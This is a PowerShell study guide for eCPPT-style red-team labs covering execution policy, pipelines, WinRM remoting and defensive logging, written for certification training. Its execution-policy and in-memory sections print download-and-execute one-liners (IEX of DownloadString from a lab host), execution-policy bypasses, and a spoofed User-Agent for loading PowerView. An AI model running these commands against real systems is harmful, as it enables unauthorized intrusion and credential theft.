# PowerShell Essentials for Engagements

> 02-RedTeam · eCPPT tools — INE-Cybersecurity-Certifications-Guide (English)

PowerShell is the operating language of a Windows network and of Windows
offensive operations. On eCPPT-style labs you will use it to enumerate hosts,
move laterally through WinRM, and run in-memory tooling. This guide covers the
mechanics — execution policy, core cmdlets, pipelines, remoting, script blocks,
in-memory loading — plus the defensive telemetry you should expect. Everything
here is for **authorized labs only**; never test bypass techniques on systems
you do not own or have written permission to assess.

## Execution policy and "bypasses"

Execution policy is a **convenience guardrail, not a security boundary**: it
stops accidental double-clicks, not a determined attacker. It is checked once,
per scope, when a script starts.

```powershell
# View effective policies, most specific scope wins
Get-ExecutionPolicy -List

# Change policy for THIS process only (no admin, no persistence)
Set-ExecutionPolicy -Scope Process Bypass -Force
Get-ExecutionPolicy

# One-shot: run a script with Bypass for just that invocation
powershell.exe -ExecutionPolicy Bypass -File .\enum.ps1
```

Common policies: `Restricted` (client default — no scripts), `RemoteSigned`
(server default — local scripts OK, downloaded ones must be signed),
`AllSigned`, `Unrestricted`, `Bypass`, `Undefined`.

Common ways operators run untrusted content in labs (again: authorized systems
only):

```powershell
# Encoded command (ASCII -> UTF-16LE -> base64) generated on Linux:
#   printf 'Get-Process' | iconv -t UTF-16LE | base64 -w0
powershell.exe -ExecutionPolicy Bypass -EncodedCommand <BASE64_BLOB>

# Download and run a script in memory (no file on disk)
powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')"

# Run a script from a file with a restricted policy
Get-Content .\script.ps1 -Raw | Invoke-Expression
```

## Core cmdlets and help

Cmdlets follow a **Verb-Noun** pattern. If you do not know the name, search:

```powershell
# Discover commands and their module/verb
Get-Command -Name *process*
Get-Command -Verb Get,Set -Noun *AD*

# Read built-in help (including examples) and the online docs
Get-Help Get-Process -Examples
Get-Help Invoke-Command -Detailed
Get-Help about_Pipelines        # concept topics start with about_
Update-Help -Force              # refresh local help once (needs internet)

# Aliases are shortcuts: ls, cd, cat, ps are aliases for cmdlets
Get-Alias | Where-Object { $_.Name -eq 'ps' }
```

Useful verbs to memorize: `Get/Set/New/Remove`, `Test`, `Out`, `Select`,
`Where`, `Sort`, `Measure`, `Export/Import`.

## Pipelines

Everything in PowerShell is an **object**; pipelines pass objects, not text.
`$_` refers to the current object inside a filter/loop block.

```powershell
# Filter -> sort -> take the top 5 by CPU
Get-Process | Where-Object { $_.CPU -gt 100 } |
    Sort-Object CPU -Descending | Select-Object -First 5 Name, CPU

# Select properties and export to CSV/JSON for later analysis
Get-Service | Where-Object { $_.Status -eq 'Running' } |
    Select-Object Name, DisplayName, StartType |
    Export-Csv .\services.csv -NoTypeInformation

# Run a block against every item (ForEach-Object, alias: %)
1..10 | ForEach-Object { $_ * $_ }        # squares of 1..10

# Member enumeration: what properties/methods does an object have?
Get-Process -Id $PID | Get-Member
```

The pattern to internalize: **`Get-* | Where-Object {filter} | Select-Object {columns}`**,
optionally feeding `Sort-Object`, `Group-Object`, `Export-Csv`, or
`ForEach-Object`.

## Remoting (WinRM)

PowerShell remoting runs over WinRM: HTTP **5985**, HTTPS **5986**. In a domain
it authenticates with Kerberos automatically; against IPs or workgroup hosts it
falls back to NTLM and needs `TrustedHosts`. Use it for enumeration and lateral
movement in labs:

```powershell
# One-time setup on target hosts (admin, opens firewall rule):
Enable-PSRemoting -Force

# Interactive shell on a remote host
Enter-PSSession -ComputerName SRV01 -Credential (Get-Credential CORP\jsmith)

# Fire a script block at one or many hosts without an interactive session
Invoke-Command -ComputerName SRV01, SRV02 -ScriptBlock { hostname; whoami }

# Reuse a persistent session (faster for many commands)
$s = New-PSSession -ComputerName SRV01 -Credential (Get-Credential)
Invoke-Command -Session $s -ScriptBlock { Get-Service -Name Spooler }
Remove-PSSession $s

# Workgroup/IP targets: allow the specific host, then reconnect
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.0.0.20" -Concatenate
```

Notes: `Invoke-Command` returns **objects**, not text — filter them with normal
pipelines. Each command creates a process on the target, which generates logs
(`-ScriptBlock` contents are visible when script block logging is on).

## Script blocks and functions

A script block is a reusable chunk of code between braces; a function wraps a
script block with a name, parameters, and output.

```powershell
# A script block stored in a variable and invoked with &
$block = { param($Name) "Hello, $Name" }
& $block "World"

# Named function with typed parameters
function Get-LabUser {
    param(
        [Parameter(Mandatory)][string]$UserName
    )
    Get-ADUser -Identity $UserName -Properties *
}
Get-LabUser -UserName jsmith
```

```powershell
# Run a script file in a child scope (like a subprocess)
& .\myscript.ps1

# Dot-source: run it IN the current scope so its variables/functions persist
. .\myscript.ps1
```

## Loading scripts in memory

Post-exploitation tooling (PowerView, Rubeus, Invoke-Mimikatz, …) is usually
delivered as a `.ps1` that you load without writing a file to the target:

```powershell
# Local module: import normally, then call its functions
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Remote: download and execute in one step
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0')          # blend in with traffic
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX $wc.DownloadString('http://10.0.0.5/PowerView.ps1')

# Remote: download to a variable first (avoids one-line quoting problems)
$code = (New-Object Net.WebClient).DownloadString('http://10.0.0.5/tool.ps1')
Invoke-Expression $code
```

## Defensive note: logging, AMSI, language mode

Assume every PowerShell action you take in an environment can be seen:

- **Script Block Logging** (Event Log
  `Microsoft-Windows-PowerShell/Operational`, ID **4104**) records the content
  of executed script blocks — including obfuscated ones, when enabled by GPO.
- **Module Logging** (ID 4103) and **Transcript logging** capture cmdlet
  invocations and full sessions.
- **AMSI** (Antimalware Scan Interface) lets AV/EDR inspect script *text*
  before execution; in-memory tooling is scanned too.
- **Constrained Language Mode (CLM)** and AppLocker/WDAC restrict which
  language features and binaries are allowed at all.
- Process creation (Event 4688 with command line; Sysmon ID 1) often records
  your `powershell.exe -enc …` invocation verbatim.

Practical consequences: your lab is the only safe place to practice in-memory
loading; on real engagements defenders will likely see your commands, so
minimize noise and coordinate with the blue team.

## Common Mistakes & Tips

- **Confusing `$_` scope inside nested blocks** — when in doubt, assign to a
  named variable (`$proc = $_`) instead of stacking `$_` in nested pipelines.
- **`Invoke-Command` returning "access denied"** — remoting needs the account
  to be a local admin (or in *Remote Management Users*) on the target.
- **Forgetting `-Credential`** — many failures are just running as the wrong
  user; pass explicit credentials instead of assuming your current context.
- **`-EncodedCommand` without UTF-16LE** — base64 of plain ASCII is *not* a
  valid encoded command; always encode the UTF-16LE bytes.
- **Download strings failing on modern TLS** — set
  `[Net.ServicePointManager]::SecurityProtocol = Tls12` first.
- **Testing bypasses outside your lab** — execution-policy and AMSI bypass
  techniques are offensive content: use them only with authorization.

## Checklist / Self-Test

- [ ] I can explain the five execution-policy scopes (`MachinePolicy`, `UserPolicy`, `Process`, `CurrentUser`, `LocalMachine`, as listed by `Get-ExecutionPolicy -List`) and set a per-process Bypass
- [ ] I can discover an unknown cmdlet with `Get-Command` and read its help
- [ ] I can build a `Get-X | Where-Object | Sort-Object | Select-Object` pipeline from memory
- [ ] I can run `Invoke-Command` and `Enter-PSSession` against a lab host with explicit credentials
- [ ] I can write, dot-source, and invoke a function with parameters
- [ ] I can load a remote `.ps1` into memory and call one of its functions
- [ ] I can name the main PowerShell defensive logs (4104/4103) and what AMSI/CLM do

> **Verification:** commands checked against `Get-ExecutionPolicy -List`, executed on Windows 10.0.26200 in Windows PowerShell 5.1.26100.8521 and also checked in PowerShell 7.6.6 on 2026-09-19 — both list five scopes: `MachinePolicy`, `UserPolicy`, `Process`, `CurrentUser`, `LocalMachine`. Corrections applied from the 19 Sep 2026 audit.

## Further Resources

- [Microsoft Learn — PowerShell documentation](https://learn.microsoft.com/en-us/powershell/)
- [Microsoft Learn — about_Execution_Policies](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)
- [Microsoft Learn — about_Pipelines](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pipelines)
- [Microsoft Learn — PowerShell remoting (WinRM)](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands)
- [MITRE ATT&CK — T1059.001: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [HackTricks — PowerShell tricks and bypasses](https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters.html)
